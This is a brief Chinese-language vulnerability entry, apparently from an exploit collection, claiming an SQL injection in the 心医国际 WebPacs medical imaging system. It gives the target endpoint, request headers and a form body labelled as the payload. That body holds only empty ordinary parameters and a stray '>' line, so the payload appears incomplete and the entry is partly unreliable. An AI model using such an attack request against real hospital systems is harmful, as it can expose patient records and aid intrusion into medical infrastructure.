# 心医国际WebPacs系统存在SQL注入漏洞

- **系统**：心医国际WebPacs系统　|　**类型**：SQL注入　|　**CVE**：—
- **请求**：`POST /WebPacs/webpacs/studylistgrid HTTP/1.1`
- **关键头**：`Content-type: application/x-www-form-urlencoded; charset=UTF-8`　`Content-Length: 154`

**请求体 / payload**
```
type=normal&jianchahao=&department=&filmstate=&truename=&devicetypename=&studystatus=&patienttype=&huanzhehao=&devicename=&datelength=7&page=1&pageSize=10
>
```

**其他**
- 版本: 心医国际WebPacs系统